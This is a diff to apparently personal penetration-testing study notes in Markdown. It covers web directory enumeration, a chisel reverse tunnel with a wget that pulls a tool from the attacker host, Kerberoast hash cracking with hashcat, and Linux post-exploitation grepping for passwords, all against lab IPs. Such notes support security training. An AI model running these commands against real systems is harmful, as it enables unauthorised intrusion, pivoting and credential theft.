@@ -92,7 +92,9 @@ feroxbuster --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-wor
 
 gobuster dir -u http://192.168.229.199:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jpg,jpeg,pdf,lnk,conf
 
+# inspect any downloaded PDFs
 exiftool -a -u info.pdf
+pdftotext umbraco.pdf
 ```
 - Enumerate any other open ports (SMB, VNC, SNMP, msql, ftp etc)
 ```bash
@@ -327,7 +329,7 @@ chisel server --port 8081 --reverse
 sudo tcpdump -nvvvXi tun0 tcp port 8081
 wget http://192.168.45.234/chisel -O chisel
 
-# access the internal webpage at 127.0.0.1:8001 - actually cannot access the webpage but the exploit will still work
+# access the internal webpage at 127.0.0.1:8001 - might not be able to access the webpage but the exploits will still work
 ./chisel
 # may need to set up chisel server using the target's open ports
 ./chisel client 192.168.45.160:80 R:60002:0.0.0.0:60002
@@ -520,7 +522,7 @@ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r rule
 Get-ChildItem -Path C:\Users -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 ```
 
-Post exploitation (linux)
+### Post exploitation (linux)
 - Find passwords on filesystem
 ```bash
 grep --color=auto -rnw '/home/archive' -iIe "PASSWORD" --color=always 2>/dev/null
